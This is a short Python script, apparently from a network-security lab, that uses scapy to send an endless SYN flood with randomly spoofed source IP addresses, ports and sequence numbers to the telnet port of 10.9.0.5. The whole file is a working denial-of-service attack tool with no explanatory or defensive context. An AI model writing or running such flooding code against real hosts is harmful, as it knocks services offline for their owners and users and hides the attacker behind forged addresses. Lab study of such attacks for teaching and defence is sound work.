#!/usr/bin/python3
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

a = IP(dst="10.9.0.5")
b = TCP(sport=1551, dport=23, seq=1551, flags='S')
pkt = a/b

i = 0

while True:
    i += 1
    pkt['IP'].src = str(IPv4Address(getrandbits(32)))
    pkt['TCP'].sport = getrandbits(16)
    pkt['TCP'].seq = getrandbits(32)
    print("Flooding..."
    , "Loops:", i, end='\r')
    send(pkt, verbose = 0)